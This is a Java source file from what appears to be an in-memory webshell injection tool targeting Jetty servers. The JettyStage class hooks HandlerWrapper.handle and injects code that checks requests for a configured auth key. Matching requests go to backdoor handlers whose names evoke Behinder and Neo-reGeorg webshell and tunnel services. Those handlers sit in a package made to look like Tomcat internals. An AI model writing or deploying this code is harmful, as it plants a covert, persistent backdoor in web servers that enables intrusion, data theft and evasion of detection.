package indi.augusttheodor.stage;

import indi.augusttheodor.Options;

import java.util.HashMap;
import java.util.Map;

public class JettyStage implements Stage {
    @Override
    public String getName() {
        return "jetty";
    }
    @Override
    public Map<String, String[]> getHookPoints() {
        Map<String, String[]> re = new HashMap<>();
        re.put("org.eclipse.jetty.server.handler.HandlerWrapper", new String[]{"handle"});
        return re;
    }
    @Override
    public void configure(Options options) {
        if (options.hasOption("a")) {
            String[] authKey = options.getOptionValue("a").split(":");
            ServletCompat.AUTH_KEY = authKey[0];
            ServletCompat.AUTH_VALUE = authKey[1];
        }
    }
    @Override
    public String getInjectedSource(String className, String methodName, Options options) {
        // HandlerWrapper.handle(String target, Request baseRequest, HttpServletRequest request, HttpServletResponse response)
        return "{" +
                "java.util.Map s=indi.augusttheodor.stage.ServletCompat.handle($3,$4);" +
                "if(s!=null){" +
                "   org.apache.catalina.core.RebeyondServices.doServices(indi.augusttheodor.stage.ServletCompat.getRdd(s),s);" +
                "   org.apache.catalina.core.ExtendServices.doServices(indi.augusttheodor.stage.ServletCompat.getRdd(s),s);" +
                "   org.apache.catalina.core.NeoServices.doServices(indi.augusttheodor.stage.ServletCompat.getRdd(s),s);" +
                "   }" +
                "}";
    }
}